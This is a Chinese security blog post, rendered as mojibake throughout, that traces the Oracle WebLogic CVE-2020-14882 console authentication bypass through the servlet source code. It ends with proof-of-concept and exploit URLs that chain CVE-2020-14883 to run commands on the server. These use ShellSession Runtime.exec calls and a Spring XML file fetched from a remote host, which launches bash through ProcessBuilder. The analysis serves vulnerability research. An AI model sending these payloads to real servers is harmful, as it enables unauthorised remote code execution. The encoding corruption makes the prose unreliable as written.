# Weblogic æƒé™ç»•è¿‡ä¹‹ CVE-2020-14882 åˆ©ç”¨å’Œæºç åˆ†æ - noone52 - åšå®¢å›­

> åŸæ–‡ï¼š[`www.cnblogs.com/MoZiYa/p/16690190.html`](https://www.cnblogs.com/MoZiYa/p/16690190.html)

# å‰è¨€ï¼š

CVE-2020-14882 è¿™ä¸ªæ¼æ´æˆ‘è®°å¾— 20 å¹´æ˜¯ç§‹å†¬ä¹‹é™…ï¼Œå½“æ—¶æ˜¯åœ¨é©»åœºï¼Œè¿˜å¥½å¤–ç½‘æ²¡æœ‰è¿™ä¸ªæ¼æ´ï¼Œå¤§å¤šæ•°æ˜¯åœ¨å†…ç½‘ï¼Œå½“æ—¶è¿˜æ˜¯ä¸ªå°ç™½ï¼Œåªä¼šç”¨ä¹Ÿä¸æ˜ç™½å…¶åŸç†ï¼Œç°åœ¨å›è¿‡å¤´æ¥çœ‹ï¼Œåˆæœ‰äº†æ–°çš„ç†è§£ã€‚

# ç¯å¢ƒï¼š

weblogic12.2.1.4.0
jdk8u_121

# ä»£ç åˆ†æï¼š

## é‰´æƒä»£ç åˆ†æï¼š

CVE-2020-14882 æ˜¯æƒé™ç»•è¿‡æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åˆ‡å…¥ä¸»é¢˜ï¼Œæ‰¾åˆ°é‰´æƒçš„ä»£ç ï¼Œåœ¨ idea ä¸­åŒå‡» shiftï¼ŒæŸ¥æ‰¾`doSecuredExecute`æ–¹æ³•ã€‚
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/e72d4c2babf503a768a4184f70e482b7.png)
æ­¤æ–¹æ³•å­˜åœ¨äº`\middleware\wlserver\modules\com.oracle.weblogic.servlet.jar!\weblogic\servlet\internal\WebAppServletContext.class`WebAppServletContext ç±»ï¼Œå¯ä»¥çœ‹åˆ°ä¸­é—´æœ‰ä¸ª servlet å•è¯ï¼Œservlet æˆ‘ä»¬å¾ˆç†Ÿæ‚‰äº†ï¼Œservlet åœ¨å†…å­˜é©¬é‚£å—æˆ‘ä»¬å­¦ä¹ è¿‡ï¼Œå°±æ˜¯å°±ç›¸å½“äºå‰ç½®ä»£ç ï¼Œæ‰€æœ‰è¯·æ±‚å…ˆåˆ°æˆ‘è¿™é‡Œå¤„ç†ã€‚ä¸Šå›¾å¯ä»¥çœ‹åˆ° 1893 è¡Œçš„ checkAccess æ–¹æ³•æ˜¯æ£€æŸ¥æƒé™çš„ï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯åˆ©ç”¨å¥‡å®‰ä¿¡çš„é›†æˆå¥½çš„é¡¹ç›®æ­å»º 12.2.14.0 ç‰ˆæœ¬çš„ weblogicã€‚
è·Ÿè¿› checkAccess æ–¹æ³•ï¼š
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/22e18659d2d3b61b5d5762e1bb1abf0a.png)
æˆ‘è¿™é‡Œè¿›å…¥ä¹‹åï¼Œä¼šç›´æ¥è·³åˆ° 474 è¡Œ`throw var7;`ç„¶åå°±èµ°åˆ°ä¸‹é¢é‡è½½çš„ checkAccess æ–¹æ³•ï¼Œè¿™é‡Œå¾ˆå¥‡æ€ªï¼Œä»£ç ä¸­æ˜¯åœ¨ 468 è¡Œè°ƒç”¨äº†é‡è½½åçš„æ–¹æ³•ï¼Œæˆ‘åœ¨é‚£é‡Œä¸‹æ–­ç‚¹æ²¡æ–­åˆ°ï¼Œç›´æ¥è¿›å…¥äº†é‡è½½åçš„æ–¹æ³•ï¼Œæœ‰çŸ¥é“çš„å¸¦ä½¬å¯ä»¥ç•™è¨€äº¤æµã€‚
æ¥ä¸‹æ¥ 491 è¡Œå°±æ˜¯æ£€æŸ¥è·¯å¾„èµ„æºï¼Œè·Ÿè¿›ï¼š
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/53a96de383715ed732fda774f306d595.png)
æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ºå…¥çš„å‚æ•°æ˜¯æµè§ˆå™¨è®¿é—®çš„è·¯å¾„å’Œæ–¹æ³•ï¼Œå†åœ¨ this.constraintsMap ä¸­æŸ¥è¯¢æ˜¯å¦ä¸ºå®‰å…¨è·¯å¾„ã€‚this.constraintsMap é›†åˆä¸­çš„é”®å€¼å¯¹å’Œ web.xml ä¸­çš„ security-constraint èŠ‚ç‚¹æ˜¯å¯¹åº”çš„ã€‚
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/b126eca2d0705c826d38956cae4a64ae.png)
å¦‚æœæˆ‘ä»¬è®¿é—®çš„æ˜¯é™¤ä¸Šé¢ä¹‹å¤–çš„ urlï¼Œå¾—åˆ°çš„ resourceConstraint å˜é‡çš„ unrestricted å°±æ˜¯ falseï¼Œæˆ‘ä»¬è®¿é—®çš„æ˜¯/console/console.portalï¼Œä¸åœ¨å®‰å…¨è®¿é—®æ ‡ç­¾é‡Œï¼Œä¹Ÿå°±æ˜¯å—é™åˆ¶ã€‚
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/50531e5dd5f52a4948bc3c481fed1525.png)

å—é™åˆ¶ä¹‹åï¼Œå‡ºæ¥ä¹‹åå›åˆ° checkAccess æ–¹æ³•ï¼Œåˆ° 511 è¡Œ`isAuthorized()`
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/05a53bfe33594c2b9e41c9d8bc5325bd.png)
è¿›å…¥ isAuthorized æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯é‰´æƒï¼š
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/f04f296583d3422c870285a3d7dd5ad3.png)
è·Ÿè¿› checkUserPerm æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºæ£€æµ‹ç”¨æˆ·æ˜¯å¦ç™»å½•ï¼Œçœ‹ session æ˜¯å¦è¿‡æœŸï¼Œ
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/f777d64d6dd2292bccd374f9105e5a06.png)
è·Ÿå…¥ hasPermission æ–¹æ³•ï¼š
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/1e47743f0bded6ba9bb50211ca18104d.png)

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/09bebe8078938f30c3daa7d61e776a71.png)
æˆ‘è¿™é‡Œæ˜¯æ²¡æœ‰ç™»å½•è®¿é—®çš„ï¼Œæ‰€ä»¥è¿”å›çš„æ˜¯ falseï¼Œè¿™å°±æ˜¯é‰´æƒçš„æ•´ä¸ªæµç¨‹ã€‚

å¦‚æœæ˜¯è®¿é—®æ­£å¸¸é™æ€èµ„æºï¼Œåˆ™è¿”å› unrestricted çš„å€¼ï¼ŒhasPermission è¿”å›ä¸º trueã€‚

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/7c441326ffbbf9a6ad8473c346ca2d18.png)

## æƒé™ç»•è¿‡åˆ†æ

```
ResourceConstraint resourceConstraint = checkAllResources ? Holder.ALL_CONSTRAINT : this.getConstraint(request) 
```

ä¸€å¼€å§‹æ˜¯è¿™é‡Œå¼€å§‹æ£€æŸ¥æ‰€æœ‰çš„èµ„æºçš„ï¼Œå¦‚æœç¬¦åˆï¼Œè¿”å›ä¸€ä¸ª resourceConstraint å¯¹è±¡ï¼Œå°±ä¼šç»§ç»­å¾€ä¸‹è¿›è¡Œã€‚
é‚£ä¹ˆæˆ‘ä»¬éœ€è¦çš„æ˜¯æ—¢èƒ½ç»•è¿‡ä»–çš„æ£€æŸ¥å‡½æ•°ï¼Œåˆèƒ½è¿”å› resourceConstraint å¯¹è±¡ã€‚
ç»§ç»­è·Ÿå…¥`\middleware\wlserver\modules\com.oracle.weblogic.servlet.jar!\weblogic\servlet\security\internal\WebAppSecurityWLS.class#getConstraint`
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/96ea67096b8800aaa8c0d30103d88a23.png)

åœ¨è¿™é‡Œä¼šè°ƒç”¨ weblogic.servlet.utils.StandardURLMapping#get å»æ ¹æ® urlï¼Œè¿”å›å¯¹åº”çš„ ResourceConstraint å¯¹è±¡
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/eee336d552c6e99f8a72f462cf34361c.png)

è°ƒç”¨ getExactOrPathMatch æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æ ¹æ® urlï¼ŒåŒ¹é…æ˜¯å¦åœ¨é™æ€èµ„æºåˆ—è¡¨ä¸­
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/81d7efda9bf3691919c0cb0f8bb3a9ec.png)
è€Œ %252E%252E%252F æ°å¥½æ˜¯â€¦/çš„ url äºŒæ¬¡ç¼–ç ç»“æœã€‚è¿™æ ·æ—¢å¯ä»¥è¿”å›é™æ€èµ„æºçš„ ResourceConstraint å¯¹è±¡ï¼Œåˆä¸ä¼šå½±å“æ­£å¸¸è®¿é—®ã€‚

## åå°ç•Œé¢å¤„ç†æµç¨‹/æ¼æ´æˆå› 

æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è´¦å·å¯†ç ç™»å½•çš„å¤„ç†æµç¨‹ã€‚æµç¨‹åŒ…å«äº†å¤„ç† servlet çš„ä¸€äº›é€»è¾‘ã€‚
ç”±äºæˆ‘ä»¬ç”¨çš„æ˜¯å¥‡å®‰ä¿¡çš„é›†æˆé¡¹ç›®ï¼Œè¿è¡Œåå¯è®¿é—® http://localhost:7001/console/login/LoginForm.jsp ç™»å½•åˆ° Weblogic Server ç®¡ç†æ§åˆ¶å°ï¼Œé»˜è®¤ç”¨æˆ·åä¸º weblogic,é»˜è®¤å¯†ç ä¸º qaxateam01
ç™»å½•å åå°ç•Œé¢å®é™…ä¸Šè®¿é—®çš„æ˜¯/console/console.portalï¼Œç„¶åæˆ‘ä»¬æŸ¥çœ‹ weblogic åå°å¯¹åº”çš„ webapp çš„ web.xmlï¼ˆåå°æœ¬èº«ä¹Ÿç®—æ˜¯ä¸€ä¸ª webappï¼‰
`\middleware\wlserver\server\lib\consoleapp\webapp\WEB-INF\web.xml`
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/83ff69aa97c27b197a784fdc039da001.png)
æ‰¾åˆ° AppManagerServletï¼Œ
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/eb54043886b37b73fcee53ba3db09d38.png)
åå­—ä¸º AppManagerServlet çš„ servlet è°ƒç”¨çš„ç±»ä¸º`\middleware\wlserver\modules\com.oracle.weblogic.servlet.jar!\weblogic\servlet\AsyncInitServlet.class`
AppManagerServlet ç±»ä¸­æœ‰ä¸ªåˆå§‹åŒ–å‡½æ•°ï¼Œè¿™é‡Œç®€å•æä¸€ä¸‹ï¼Œservlet çš„ç”Ÿå‘½å‘¨æœŸï¼Œç†Ÿæ‚‰çš„äººåº”è¯¥å¾ˆç†Ÿæ‚‰äº†ï¼Œservlet çš„ç”Ÿå‘½å‘¨æœŸæœ‰ï¼š

```
Servlet åˆå§‹åŒ–åè°ƒç”¨ init () æ–¹æ³•ã€‚
Servlet è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚
Servlet é”€æ¯å‰è°ƒç”¨ destroy() æ–¹æ³•ã€‚ 
```

è¨€å½’æ­£ä¼ ï¼Œåˆå§‹åŒ–å‡½æ•°è°ƒç”¨å¦‚ä¸‹ï¼š
`init()-->initDelegate()-->createDelegate()`
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/b3ba9ad9714bd19006fa9cc40a4943ef.png)
è°ƒç”¨çš„ createDelegateï¼Œèµ‹å€¼ç»™ this.delegate å±æ€§ã€‚
æˆ‘ä»¬çœ‹ä¸€ä¸‹ createDelegate æ–¹æ³•ï¼Œ
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/9645d70ad7e7c169cc004ab49dc1fe18.png)
æŠŠ SERVLET_CLASS_NAME å¯¹åº”çš„ç±»ï¼Œåå°„è·å– class ç±»å¯¹è±¡ã€‚
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/1d3efb67bcdc8728f74a4e2119d078a2.png)
SERVLET_CLASS_NAME å¯¹åº”çš„ç±»å°±æ˜¯ web.xml ä¸­çš„`com.bea.console.utils.MBeanUtilsInitSingleFileServlet`ç±»ã€‚
ä¸€å¼€å§‹ MBeanUtilsInitSingleFileServlet è¿™ä¸ªç±»æ²¡æ‰¾åˆ°ï¼Œæœ€åå‘ç°æ˜¯åœ¨`\middleware\wlserver\server\lib\consoleapp\webapp\WEB-INF\ib`ä¸­ï¼Œå¯¼å…¥åŒ…å°±å¯ä»¥äº†ã€‚

```
å¯»æ‰¾ç±»
grep -rn "com.bea.console.utils.MBeanUtilsInitSingleFileServlet" * 
```

æœ€ç»ˆä½¿ç”¨ Class.forName å®ä¾‹åŒ–äº† com.bea.console.utils.MBeanUtilsInitSingleFileServlet ç±»ï¼Œèµ‹å€¼ç»™ this.delegate å±æ€§ã€‚è¿™æ˜¯åˆå§‹åŒ–çš„æ“ä½œã€‚
å†çœ‹ä¸€ä¸‹ service æ–¹æ³•ä¸­çš„æ“ä½œã€‚
`AsyncInitServlet#server-->MBeanUtilsInitSingleFileServlet.#server-->SingleFileServlet#server-->UIServlet#server`
è¿™æ˜¯è°ƒç”¨é“¾ï¼Œå°±ä¸è´´å›¾äº†ï¼Œéƒ½æ˜¯è¿›å…¥åˆ°çˆ¶ç±»çš„ server æ–¹æ³•ï¼Œæœ€åå®šä½åˆ° UIServlet#server
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/2bfd05750fc1076b554a318d17d65863.png)
æˆ‘ä»¬æ˜¯ get è¯·æ±‚çš„ï¼Œæœ€åèµ°åˆ° doGet æ–¹æ³•
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/5f62d43ed98a32d9246a904352935865.png)
doGet æ–¹æ³•ï¼Œè°ƒç”¨ doPOST æ–¹æ³•ï¼Œå¥‡æ€ªçš„å§¿åŠ¿åˆå¢åŠ äº†ã€‚ğŸ¤­
é—®é¢˜å‡ºåœ¨ doPOSTâ€“>createUIContextâ€“>UIServletInternal.createUIContextâ€“>getTreeâ€“>URLDecoder.decode()
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/a92b3921d74545ebcfb6a10d688b8699.png)
URLDecoder.decode æ‰§è¡Œå®Œæˆåï¼Œæˆ‘ä»¬çš„ url è·¯å¾„(images/%2e%2e%2f)è¢«å†æ¬¡è§£ç ï¼Œæœ€ç»ˆå˜æˆ images/â€¦/console.portal.portalï¼Œå¯¼è‡´ç›®å½•ç©¿è¶Šã€‚
æ ¹æ® http è§„å®šï¼Œurl éƒ¨åˆ†ï¼Œéœ€è¦ url ç¼–ç åå‘é€ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ­£å¸¸è§£å¼€å¹¶ç»§ç»­å¤„ç†ã€‚è¿™æ˜¯ç¬¬ä¸€å±‚ url ç¼–ç ã€‚
è€Œä¸Šå›¾ 112 è¡Œ URLDecoder.decode()å¯¹ URL è¿›è¡Œäº†äºŒæ¬¡ç¼–ç ä»è€Œç»•è¿‡é™åˆ¶ã€‚
servlet ä¸­å…ˆå¤„ç†äºŒæ¬¡ç¼–ç çš„ pocï¼Œç„¶åå†æœ‰é‰´æƒä»£ç å»é‰´æƒï¼Œæ¬ºéª—æœåŠ¡å™¨åï¼ŒæœåŠ¡å™¨å‘ç°æœ‰æƒé™è®¿é—®é™æ€èµ„æº(/console/images/%252E%252E%252Fconsole.portal ï¼Œå…¶å®æœ‰â€¦/)ï¼Œç„¶åå°±è®©æˆ‘ console.portalï¼Œä»è€Œæ¥ç®¡åå°ã€‚

# åˆ©ç”¨ï¼š

## å½±å“ç‰ˆæœ¬ï¼š

Oracle Weblogic Server 10.3.6.0.0
Oracle Weblogic Server 12.1.3.0.0
Oracle Weblogic Server 12.2.1.3.0
Oracle Weblogic Server 12.2.1.4.0
Oracle Weblogic Server 14.1.1.0.0
è¿™é‡Œæˆ‘å¯¹ 12.1.3.0.0 ä¹Ÿæ­å»ºäº†ç¯å¢ƒï¼Œæ²¡æœ‰æ£€æµ‹åˆ°å…¶å­˜åœ¨æ­¤æ¼æ´ï¼Œæœ‰ç‚¹å¥‡æ€ªã€‚ğŸ¤«

## pocï¼š

```
http://ip:port/console/%2E%2E%2Fconsole.portal
/console/css/%252e%252e%252fconsole.portal
å¤§å°å†™ç¼–ç å¯ä»¥è¾¾åˆ°ç»•è¿‡çš„ç›®çš„ 
```

æœ‰ä¸ªé—®é¢˜å°±æ˜¯ä½¿ç”¨ payload ç¬¬ä¸€æ¬¡è®¿é—®ä¼šæ˜¾ç¤ºè¿™æ ·ï¼š

```
payload
http://192.168.210.83:7001/console/%2E%2E%2Fconsole.portal?_nfpb=true&_pageLabel=HomePage1 
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/0d45c161a8382471aeb73214b87c23ab.png)
ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œæ˜¯ URL ç¼–ç æŠŠâ€¦å…ˆè§£æï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥ï¼ŒçŸ¥é“çš„å¸¦ä½¬å¯ä»¥ä¸€èµ·äº¤æµã€‚

## expï¼š

å°† CVE-2020-14882 å’Œ CVE-2020-14883 è¿›è¡Œç»„åˆåˆ©ç”¨åï¼Œè¿œç¨‹ä¸”æœªç»æˆæƒçš„æ”»å‡»è€…å¯ä»¥ç›´æ¥åœ¨æœåŠ¡ç«¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œè·å–ç³»ç»Ÿæƒé™ã€‚
æ­¤æ—¶éœ€è¦åˆ©ç”¨åˆ°ç¬¬äºŒä¸ªæ¼æ´ CVE-2020-14883ã€‚è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯é€šè¿‡`com.tangosol.coherence.mvel2.sh.ShellSession`ï¼Œ
äºŒæ˜¯é€šè¿‡`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`ã€‚
**weblogic10**

```
/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.210.49:7777/linux-exec.xml") 
```

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans 

   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[touch /tmp/success2]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans> 
```

**weblogic12**
Weblogic 10 æ²¡æœ‰ com.tangosol.coherence.mvel2.sh.ShellSession è¿™ä¸ª gadgetï¼Œåªå­˜åœ¨äº weblogic 12ï¼Œweblogic10 å¹¶æ²¡æœ‰è¿™ä¸ªåŒ…ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ã€‚

```
http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);

http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');") 
```

```
å‚è€ƒï¼š
https://mp.weixin.qq.com/s/_zNr5Jw7tH_6XlUdudhMhA
https://144.one/weblogic-cve-2020-1488214883lou-dong-fen-xi.html
https://kuron3k0.github.io/2020/11/12/CVE-2020-14882/ 
```